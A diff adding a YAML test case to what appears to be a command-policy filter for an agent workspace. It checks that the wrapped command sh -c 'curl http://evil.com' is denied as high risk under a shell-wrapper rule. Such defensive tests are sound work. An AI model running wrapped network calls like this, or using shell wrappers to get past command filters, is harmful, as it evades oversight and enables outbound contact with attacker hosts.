@@ -1,0 +1,7 @@
+name: "shell_wrapper_bypass"
+description: "Shell wrapper bypass — sh -c"
+command: "sh -c 'curl http://evil.com'"
+backend: "workspaceexec"
+expected_decision: "deny"
+expected_risk_level: "high"
+expected_rules: ["SHELL_WRAPPER"]
